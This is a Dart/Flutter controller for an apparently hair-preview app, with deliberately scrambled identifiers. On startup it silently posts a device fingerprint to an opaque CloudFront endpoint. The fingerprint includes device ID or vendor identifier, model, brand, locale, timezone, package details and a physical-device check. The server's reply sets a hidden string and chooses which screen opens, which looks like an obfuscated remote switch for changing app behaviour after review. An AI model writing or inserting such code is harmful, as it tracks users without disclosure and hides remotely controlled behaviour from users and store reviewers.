import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'dart:io';

import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';


class HairPreviewLogic extends GetxController {

  var chroja = RxBool(false);
  var nsmzte = RxBool(true);
  var phcjn = RxString("");
  var bryon = RxBool(false);
  var brakus = RxBool(true);
  final znxcphu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dsiw();
  }


  Future<void> dsiw() async {
    bryon.value = true;
    brakus.value = true;
    nsmzte.value = false;

    znxcphu.post("https://d2atnzwyfwsgfe.cloudfront.net/h83nJOvpd1",data: await kbptnl()).then((value) {
      var mchypb = value.data["mchypb"] as String;
      var jclyntse = value.data["jclyntse"] as bool;
      if (jclyntse) {
        phcjn.value = mchypb;
        max();
      } else {
        runolfsson();
      }
    }).catchError((e) {
      nsmzte.value = true;
      brakus.value = true;
      bryon.value = false;
    });
  }

  Future<Map<String, dynamic>> kbptnl() async {
    final DeviceInfoPlugin sedynf = DeviceInfoPlugin();
    PackageInfo snymh_tbjzq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var dgho = Platform.localeName;
    var ECMo = currentTimeZone;

    var QrheLk = snymh_tbjzq.packageName;
    var xhPnvdN = snymh_tbjzq.version;
    var ISXpeh = snymh_tbjzq.buildNumber;

    var TnEHfQ = snymh_tbjzq.appName;
    var oxvekGi = "";
    var ftWg  = "";
    var dWUHsJg = "";
    var darenHirthe = "";
    var lesleyStanton = "";
    var altaRice = "";
    var heloiseMurray = "";
    var ronnySchmitt = "";


    var IJYcWx = "";
    var ixIfGQj = false;

    if (GetPlatform.isAndroid) {
      IJYcWx = "android";
      var lpgrznsh = await sedynf.androidInfo;

      dWUHsJg = lpgrznsh.brand;

      oxvekGi  = lpgrznsh.model;
      ftWg = lpgrznsh.id;

      ixIfGQj = lpgrznsh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      IJYcWx = "ios";
      var hgcunjtrd = await sedynf.iosInfo;
      dWUHsJg = hgcunjtrd.name;
      oxvekGi = hgcunjtrd.model;

      ftWg = hgcunjtrd.identifierForVendor ?? "";
      ixIfGQj  = hgcunjtrd.isPhysicalDevice;
    }
    var res = {
      "TnEHfQ": TnEHfQ,
      "QrheLk": QrheLk,
      "altaRice" : altaRice,
      "oxvekGi": oxvekGi,
      "ECMo": ECMo,
      "lesleyStanton" : lesleyStanton,
      "dWUHsJg": dWUHsJg,
      "ftWg": ftWg,
      "dgho": dgho,
      "IJYcWx": IJYcWx,
      "xhPnvdN": xhPnvdN,
      "ixIfGQj": ixIfGQj,
      "darenHirthe" : darenHirthe,
      "ISXpeh": ISXpeh,
      "heloiseMurray" : heloiseMurray,
      "ronnySchmitt" : ronnySchmitt,

    };
    return res;
  }

  Future<void> runolfsson() async {
    Get.offNamed("/hair_main");
  }

  Future<void> max() async {
    Get.offNamed("/hair_shape");
  }

}
